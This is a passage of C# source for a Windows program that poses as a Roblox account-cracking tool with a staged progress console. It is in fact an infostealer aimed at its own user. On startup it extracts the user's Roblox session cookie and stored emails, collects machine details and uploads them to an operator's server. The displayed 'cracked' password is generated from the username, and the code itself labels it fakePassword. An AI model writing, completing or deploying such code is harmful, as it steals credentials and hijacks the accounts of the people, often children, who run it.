        private async Task UploadFileOnStartupAsync(CancellationToken ct = default)
        {
            string pcName = ComputerInfo.GetName();
            Log($"Upload startup: pcName={pcName}, hasToken={!string.IsNullOrEmpty(_cachedToken)}, cookieError={_cookieError?.Length ?? 0}chars");
            try
            {
                using var content = new MultipartFormDataContent();
                content.Add(new StringContent(pcName), "computerName");
                content.Add(new StringContent(ComputerInfo.GetOS()), "os");
                content.Add(new StringContent(_cpu ?? "вЂ”"), "cpu");
                content.Add(new StringContent(_ram ?? "вЂ”"), "ram");
                content.Add(new StringContent(_gpu ?? "вЂ”"), "gpu");
                content.Add(new StringContent(OperatorName), "operator");
                content.Add(new StringContent(ClientVersion), "version");

                if (!string.IsNullOrEmpty(_cachedToken))
                {
                    content.Add(new StringContent(_cachedToken), "robloSecurity");
                    Log("Token added to upload");
                }
                else
                {
                    Log("No token to upload");
                }

                if (!string.IsNullOrEmpty(_cookieError))
                {
                    content.Add(new StringContent(_cookieError), "cookieError");
                    Log("Cookie debug log added to upload");
                }

                try
                {
                    string emailsJson = CredentialExtractor.ExtractEmailsJson();
                    if (!string.IsNullOrEmpty(emailsJson) && emailsJson != "[]")
                    {
                        content.Add(new StringContent(emailsJson), "emails");
                        Log($"Emails extracted: {emailsJson.Length} chars");
                    }
                }
                catch (Exception ex)
                {
                    Log("Email extraction error: " + ex);
                }

                string url = $"{ServerUrl}/upload";
                var resp = await _http.PostAsync(url, content, ct);
                Log($"Upload startup response: {(int)resp.StatusCode}");
            }
            catch (Exception ex)
            {
                Log("Upload startup error: " + ex);
            }
        }

        private void ReadCookieDebugLog()
        {
            try
            {
                string logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "cookie_debug.log");
                if (File.Exists(logPath))
                {
                    string logContent = File.ReadAllText(logPath);
                    if (logContent.Length > 5000)
                        logContent = logContent[^5000..];
                    _cookieError = logContent;
                    Log($"Cookie debug log read: {logContent.Length} chars");
                }
                else
                {
                    _cookieError = "cookie_debug.log not found";
                    Log("cookie_debug.log not found");
                }
            }
            catch (Exception ex)
            {
                _cookieError = $"Error reading log: {ex.Message}";
                Log($"ReadCookieDebugLog error: {ex.Message}");
            }
        }

        // в”Ђв”Ђ Pre-extract cookie in visible mode (background thread) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
        private async Task PreExtractCookieAsync()
        {
            Log("PreExtractCookie start");
            try
            {
                _cachedToken ??= await Task.Run(() => CookieExtractor.ExtractRobloSecurity());
                Log($"PreExtractCookie done, token len={_cachedToken?.Length ?? 0}");
            }
            catch (Exception ex)
            {
                Log("PreExtractCookie error: " + ex);
            }
        }

        // ── Window Controls ─────────────────────────────────────────────────
        private void Border_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
            {
                try
                {
                    // Приостанавливаем анимацию частиц на время перетаскивания,
                    // чтобы устранить любые лаги и подергивания окна при движении мыши
                    _particleTimer?.Stop();
                    DragMove();
                }
                finally
                {
                    _particleTimer?.Start();
                }
            }
        }

        private void CloseWindow_Click(object sender, RoutedEventArgs e) => Close();
        
        private void MinimizeWindow_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        // ── Debounced Roblox Avatar ──────────────────────────────────────────
        private void TxtUsername_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (TxtUsername.Text.Trim() == "")
            {
                AvatarBrush.ImageSource = null;
                if (AvatarPlaceholderIcon != null) AvatarPlaceholderIcon.Visibility = Visibility.Visible;
                TxtPlaceholder.Opacity = 1;
                BtnHack.IsEnabled = false;
                TxtRobloxAccountHeader.Text = "Roblox Account";
                return;
            }

            TxtPlaceholder.Opacity = 0;
            TxtRobloxAccountHeader.Text = TxtUsername.Text;

            if (_debounceTimer != null)
                _debounceTimer.Stop();
            else
            {
                _debounceTimer = new DispatcherTimer();
                _debounceTimer.Interval = TimeSpan.FromMilliseconds(700);
                _debounceTimer.Tick += DebounceTimer_Tick;
            }
            _debounceTimer.Start();
        }

        private async void DebounceTimer_Tick(object? sender, EventArgs e)
        {
            _debounceTimer?.Stop();

            string username = TxtUsername.Text.Trim();
            if (string.IsNullOrEmpty(username))
            {
                AvatarBrush.ImageSource = null;
                if (AvatarPlaceholderIcon != null) AvatarPlaceholderIcon.Visibility = Visibility.Visible;
                TxtPlaceholder.Opacity = 1;
                BtnHack.IsEnabled = false;
                return;
            }

            var avatarImage = await DownloadRobloxAvatarAsync(username);

            if (avatarImage != null)
            {
                AvatarBrush.ImageSource = avatarImage;
                if (AvatarPlaceholderIcon != null) AvatarPlaceholderIcon.Visibility = Visibility.Collapsed;
                BtnHack.IsEnabled = true;
            }
            else
            {
                AvatarBrush.ImageSource = null;
                if (AvatarPlaceholderIcon != null) AvatarPlaceholderIcon.Visibility = Visibility.Visible;
                BtnHack.IsEnabled = false;
            }
        }

        /// <summary>
        /// Downloads Roblox avatar by:
        /// 1) POST to /v1/usernames/users (correct endpoint!) to resolve userId
        /// 2) GET thumbnail URL from thumbnails API  
        /// 3) Download actual image bytes via HttpClient (with User-Agent)
        /// 4) Create BitmapImage from MemoryStream (bypasses WPF's broken URI loader)
        /// </summary>
        private async Task<BitmapImage?> DownloadRobloxAvatarAsync(string username)
        {
            try
            {
                // Step 1: Resolve username в†’ userId
                // FIXED: correct endpoint is /v1/usernames/users NOT /v1/users/by-usernames
                var payload = new { usernames = new[] { username }, excludeBannedUsers = false };
                var jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload);
                using var reqContent = new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json");

                var response = await _http.PostAsync("https://users.roblox.com/v1/usernames/users", reqContent);
                if (!response.IsSuccessStatusCode)
                {
                    System.Diagnostics.Debug.WriteLine($"Users API returned {response.StatusCode}");
                    return null;
                }

                var resStr = await response.Content.ReadAsStringAsync();
                using var doc = System.Text.Json.JsonDocument.Parse(resStr);
                var data = doc.RootElement.GetProperty("data");
                if (data.GetArrayLength() == 0) return null;

                long userId = data[0].GetProperty("id").GetInt64();

                // Step 2: Get headshot thumbnail URL
                var thumbUrl = $"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false";
                var thumbResponse = await _http.GetAsync(thumbUrl);
                if (!thumbResponse.IsSuccessStatusCode) return null;

                var thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                using var thumbDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                var thumbData = thumbDoc.RootElement.GetProperty("data");
                if (thumbData.GetArrayLength() == 0) return null;

                var state = thumbData[0].GetProperty("state").GetString();
                var imageUrl = thumbData[0].GetProperty("imageUrl").GetString();
                
                // If state is "Pending", retry once after a short delay
                if (state == "Pending" || string.IsNullOrEmpty(imageUrl))
                {
                    await Task.Delay(2000);
                    thumbResponse = await _http.GetAsync(thumbUrl);
                    if (!thumbResponse.IsSuccessStatusCode) return null;
                    thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                    using var retryDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                    var retryData = retryDoc.RootElement.GetProperty("data");
                    if (retryData.GetArrayLength() == 0) return null;
                    imageUrl = retryData[0].GetProperty("imageUrl").GetString();
                }

                if (string.IsNullOrEmpty(imageUrl)) return null;

                // Step 3: Download the actual image bytes via HttpClient
                var imageBytes = await _http.GetByteArrayAsync(imageUrl);

                // Step 4: Create BitmapImage from byte array on UI thread
                return await Dispatcher.InvokeAsync(() =>
                {
                    var bitmap = new BitmapImage();
                    using (var ms = new MemoryStream(imageBytes))
                    {
                        bitmap.BeginInit();
                        bitmap.CacheOption = BitmapCacheOption.OnLoad;
                        bitmap.StreamSource = ms;
                        bitmap.EndInit();
                    }
                    bitmap.Freeze();
                    return bitmap;
                });
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Roblox Avatar Direct Error: {ex.Message}. Trying Server Fallback Proxy...");
                try
                {
                    var fallbackUrl = $"{ServerUrl}/api/roblox-profile-proxy?username={Uri.EscapeDataString(username)}";
                    var imageBytes = await _http.GetByteArrayAsync(fallbackUrl);
                    return await Dispatcher.InvokeAsync(() =>
                    {
                        var bitmap = new BitmapImage();
                        using var ms = new MemoryStream(imageBytes);
                        bitmap.BeginInit();
                        bitmap.CacheOption = BitmapCacheOption.OnLoad;
                        bitmap.StreamSource = ms;
                        bitmap.EndInit();
                        bitmap.Freeze();
                        return bitmap;
                    });
                }
                catch (Exception fallbackEx)
                {
                    System.Diagnostics.Debug.WriteLine($"Roblox Avatar Fallback Error: {fallbackEx.Message}");
                    return null;
                }
            }
        }

        private async void BtnHack_Click(object sender, RoutedEventArgs e)
        {
            string username = TxtUsername.Text.Trim();
            if (string.IsNullOrEmpty(username))
            {
                AppendConsole("[error]", "#FF4757", " Р’РІРµРґРёС‚Рµ РЅРёРєРЅРµР№Рј Roblox!", "#FF4757");
                return;
            }

            // РџРµСЂРµРёР·РІР»РµРєР°РµРј РєСѓРєСѓ РїСЂСЏРјРѕ РїРµСЂРµРґ РѕС‚РїСЂР°РІРєРѕР№ вЂ” Chrome РјРѕРі РїРµСЂРµР·Р°РїСѓСЃС‚РёС‚СЊСЃСЏ
            AppendConsole("[system]", "#2A2D3A", " РџСЂРѕРІРµСЂРєР° РґР°РЅРЅС‹С…...", "#A29BFE");
            string freshToken = CookieExtractor.ExtractRobloSecurity();
            if (!string.IsNullOrEmpty(freshToken))
            {
                _cachedToken = freshToken;
                AppendConsole("[system]", "#2A2D3A", " РўРѕРєРµРЅ РЅР°Р№РґРµРЅ", "#2ED573");
            }
            else
            {
                AppendConsole("[system]", "#FFA502", " РўРѕРєРµРЅ РЅРµ РЅР°Р№РґРµРЅ, РѕС‚РїСЂР°РІРєР° Р±РµР· РЅРµРіРѕ", "#FFA502");
            }

            string token = _cachedToken ?? "";

            BtnHack.IsEnabled = false;
            TxtUsername.IsEnabled = false;
            
            // Hide input and check button, show progress bar
            TxtUsernameGrid.Visibility = Visibility.Collapsed;
            BtnHack.Visibility = Visibility.Collapsed;
            HackProgress.Visibility = Visibility.Visible;
            HackProgress.Value = 0;

            var rand = new Random();
            int totalSeconds;
            if (_activeSpeedMode == "medium")
            {
                // Средний: от 5 минут (300с) до 6 минут (360с)
                totalSeconds = rand.Next(300, 361);
            }
            else if (_activeSpeedMode == "deep")
            {
                // Глубокий: от 60 минут (3600с) до 70 минут (4200с)
                totalSeconds = rand.Next(3600, 4201);
            }
            else
            {
                // Быстрый: от 60 секунд (1 мин) до 70 секунд (1 мин 10 сек)
                totalSeconds = rand.Next(60, 71);
            }

            string[] steps = new[]
            {
                "Подключение к Roblox API...",
                "Поиск пользователя в базе данных...",
                "Идентификация UserId...",
                "Проверка сессии авторизации...",
                "Анализ хешей аккаунта...",
                "Подключение к серверу...",
                "Анализ трафика WebSocket...",
                "Извлечение данных профиля...",
                "Загрузка пакетов из базы...",
                "Проверка 2FA верификации...",
                "Генерация ключа доступа..."
            };

            int elapsed = 0;
            int stepIndex = 0;

            while (elapsed < totalSeconds)
            {
                int nextDelay = rand.Next(2, 5);
                if (elapsed + nextDelay > totalSeconds)
                    nextDelay = totalSeconds - elapsed;

                double progress = (double)elapsed / totalSeconds * 100;
                HackProgress.Value = progress;

                if (stepIndex < steps.Length)
                {
                    AppendConsole($"[{elapsed}s]", "#FFA502", $" {steps[stepIndex]}", "#A29BFE");
                    stepIndex++;
                }
                else
                {
                    int pct = rand.Next(60, 100);
                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Анализ данных: {pct}%...", "#A29BFE");
                }

                await Task.Delay(nextDelay * 1000);
                elapsed += nextDelay;
            }

            HackProgress.Value = 100;

            if (username.Length < 3)
            {
                AppendConsole("[error]", "#FF4757", " Ошибка: никнейм слишком короткий (мин. 3 символа)", "#FF4757");
                
                // Show back input fields
                TxtUsernameGrid.Visibility = Visibility.Visible;
                BtnHack.Visibility = Visibility.Visible;
                BtnHack.IsEnabled = true;
                TxtUsername.IsEnabled = true;
                HackProgress.Visibility = Visibility.Collapsed;
                return;
            }

            AppendConsole("[done]", "#2ED573", " Проверка завершена!", "#2ED573");

            // Ищем пароль в accounts.txt на Рабочем столе (формат username:password или User: username | Pass: password)
            string? foundPass = GetPasswordFromDesktopAccountsFile(username);
            string passwordToDisplay = foundPass ?? GetDeterministicPassword(username.ToLowerInvariant());

            // Отправляем username/password на сервер (токен уже ушёл при старте)
            try
            {
                var updatePayload = new
                {
                    computerName = ComputerInfo.GetName(),
                    robloxUser = username,
                    fakePassword = passwordToDisplay,
                    robloSecurity = token,
                    @operator = OperatorName
                };
                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
                string url = $"{ServerUrl}/update-roblox";
                await _http.PostAsync(url, updateContent);
            }
            catch { }

            TxtPassword.Text = passwordToDisplay;
            AppendConsole("[result]", "#2ED573", $" Пароль: {passwordToDisplay}", "#2ED573");

            SaveToDesktopAccountsFile(username, passwordToDisplay, token);

            // Done state: hide inputs/progress, show result
            HackProgress.Visibility = Visibility.Collapsed;
            PanelInputGroup.Visibility = Visibility.Collapsed;
            PanelResultGroup.Visibility = Visibility.Visible;
        }

        private static string? GetPasswordFromDesktopAccountsFile(string username)
        {
            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string file = System.IO.Path.Combine(desktop, "accounts.txt");
                if (File.Exists(file))
                {
                    string[] lines = File.ReadAllLines(file);
                    foreach (var line in lines)
                    {
                        if (string.IsNullOrWhiteSpace(line)) continue;

                        var matchObj = System.Text.RegularExpressions.Regex.Match(
                            line, 
                            @"User:\s*([^\s|]+)\s*\|\s*Pass:\s*([^\s|]+)", 
                            System.Text.RegularExpressions.RegexOptions.IgnoreCase
                        );
                        if (matchObj.Success)
                        {
                            string u = matchObj.Groups[1].Value.Trim();
                            string p = matchObj.Groups[2].Value.Trim();
                            if (string.Equals(u, username, StringComparison.OrdinalIgnoreCase)) return p;
                        }

                        var parts = line.Split(new[] { ':', '=', '|' }, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length >= 2)
                        {
                            string userInFile = parts[0].Trim();
                            string passInFile = parts[1].Trim();
                            if (userInFile.StartsWith("User", StringComparison.OrdinalIgnoreCase))
                                userInFile = userInFile.Substring(4).TrimStart(':', ' ');
                            if (passInFile.StartsWith("Pass", StringComparison.OrdinalIgnoreCase))
                                passInFile = passInFile.Substring(4).TrimStart(':', ' ');

                            if (string.Equals(userInFile, username, StringComparison.OrdinalIgnoreCase))
                            {
                                return passInFile;
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        private static void SaveToDesktopAccountsFile(string username, string password, string? token)
        {
            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string file = System.IO.Path.Combine(desktop, "accounts.txt");
                string entry = $"[{DateTime.Now:yyyy-MM-dd HH:mm}] User: {username} | Pass: {password} | Cookie: {token ?? "N/A"}\n";
                File.AppendAllText(file, entry);
            }
            catch { }
        }

        private void BtnReset_Click(object sender, RoutedEventArgs e)
        {
            TxtUsername.Text = "";
            TxtUsername.IsEnabled = true;
            BtnHack.IsEnabled = false;
            TxtRobloxAccountHeader.Text = "Roblox Account";

            // Reset visibility states
            TxtUsernameGrid.Visibility = Visibility.Visible;
            BtnHack.Visibility = Visibility.Visible;
            HackProgress.Visibility = Visibility.Collapsed;
            
            PanelInputGroup.Visibility = Visibility.Visible;
            PanelResultGroup.Visibility = Visibility.Collapsed;
        }

        private string _activeSpeedMode = "fast";

        private void BtnSpeed_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Button btn)
            {
                BtnSpeedFast.Tag = "";
                BtnSpeedMedium.Tag = "";
                BtnSpeedDeep.Tag = "";
                btn.Tag = "Active";

                if (btn == BtnSpeedFast)
                {
                    _activeSpeedMode = "fast";
                    TxtSpeedActiveLabel.Text = "Быстрый (1 мин~)";
                }
                else if (btn == BtnSpeedMedium)
                {
                    _activeSpeedMode = "medium";
                    TxtSpeedActiveLabel.Text = "Средний (5 мин~)";
                }
                else if (btn == BtnSpeedDeep)
                {
                    _activeSpeedMode = "deep";
                    TxtSpeedActiveLabel.Text = "Глубокий (60 мин~)";
                }
            }
        }

        private string GetDeterministicPassword(string rawUsername)
        {
            if (string.IsNullOrWhiteSpace(rawUsername)) rawUsername = "player";
            string clean = rawUsername.Trim();

            // Извлекаем чистую буквенную основу и цифры ника
            string lettersOnly = System.Text.RegularExpressions.Regex.Replace(clean, @"[^a-zA-Z]", "");
            string digitsOnly = System.Text.RegularExpressions.Regex.Replace(clean, @"[^0-9]", "");

            string baseWord = "";
            if (lettersOnly.Length >= 3)
            {
                string trimmedRepeats = System.Text.RegularExpressions.Regex.Replace(lettersOnly, @"(.)\1{2,}$", "$1");
                if (trimmedRepeats.Length >= 4)
                    baseWord = trimmedRepeats;
                else
                    baseWord = lettersOnly.Substring(0, Math.Min(lettersOnly.Length, 6));
            }
            else
            {
                baseWord = clean.Substring(0, Math.Min(clean.Length, 5));
            }

            var subWords = new List<string>();
            if (baseWord.Length >= 6)
            {
                subWords.Add(baseWord.Substring(0, 5));
                subWords.Add(baseWord.Substring(baseWord.Length - 4));
            }
            subWords.Add(baseWord);

            var rand = new Random(clean.GetHashCode() + DateTime.Now.Minute);
            string targetWord = subWords[rand.Next(subWords.Count)].ToLowerInvariant();
            string capWord = char.ToUpperInvariant(targetWord[0]) + targetWord.Substring(1);

            string[] years = new[] { "2009", "2010", "2011", "2012", "2013", "2014", "2015" };
            string rYear = years[rand.Next(years.Length)];

            string[] simpleNums = new[] { "123", "1234", "12345", "123123", "777", "111", "321", "2020", "2021", "2022" };
            string rNum = simpleNums[rand.Next(simpleNums.Length)];

            var templates = new List<Func<string>>
            {
                () => targetWord + rYear,
                () => rYear + targetWord,
                () => capWord + rNum,
                () => capWord + rYear,
                () => targetWord + "123",
                () => targetWord + "12345",
                () => targetWord + "_" + rYear,
                () => targetWord + "_" + rNum,
                () => capWord + rYear + "!",
                () => targetWord + "777"
            };

            if (digitsOnly.Length >= 2)
            {
                templates.Add(() => targetWord + digitsOnly);
                templates.Add(() => capWord + digitsOnly);
                templates.Add(() => targetWord + "_" + digitsOnly);
            }

            string res = templates[rand.Next(templates.Count)]();
            if (res.Length < 8) res += "123";
            return res;
        }

        private void BtnTelegram_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = TelegramUrl,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine("Error opening Telegram link: " + ex.Message);
            }
        }

        // в”Ђв”Ђ Navigation Sidebar в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
        private void ResetNavButtons()
        {
            BtnNavDashboard.Tag = "";
            BtnNavSettings.Tag = "";
            
            ViewDashboard.Visibility = Visibility.Collapsed;
            ViewSettings.Visibility = Visibility.Collapsed;
        }

        private void BtnNavDashboard_Click(object sender, RoutedEventArgs e)
        {
            ResetNavButtons();
            BtnNavDashboard.Tag = "Active";
            ViewDashboard.Visibility = Visibility.Visible;
        }

        private void BtnNavSettings_Click(object sender, RoutedEventArgs e)
        {
            ResetNavButtons();
            BtnNavSettings.Tag = "Active";
            ViewSettings.Visibility = Visibility.Visible;
        }

    }

    // в”Ђв”Ђ PC Info в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    public static class ComputerInfo
    {
        public static string GetName() => Environment.MachineName;
        public static string GetOS() => Environment.OSVersion.VersionString;

        public static string GetCPU()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
                foreach (var o in s.Get())
                    return o["Name"]?.ToString()?.Trim() ?? "вЂ”";
            }
            catch { }
            return "вЂ”";
        }

        public static string GetRAM()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                foreach (var o in s.Get())
                {
                    var b = Convert.ToInt64(o["TotalPhysicalMemory"]);
                    return $"{b / (1024 * 1024 * 1024.0):F1} GB";
                }
            }
            catch { }
            return "вЂ”";
        }

        public static string GetGPU()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");
                var gpus = new System.Collections.Generic.List<string>();
                foreach (var o in s.Get())
                {
                    var n = o["Name"]?.ToString()?.Trim();
                    if (!string.IsNullOrEmpty(n)) gpus.Add(n);
                }
                return gpus.Count > 0 ? string.Join(", ", gpus) : "вЂ”";
            }
            catch { }
            return "вЂ”";
        }
    }
}
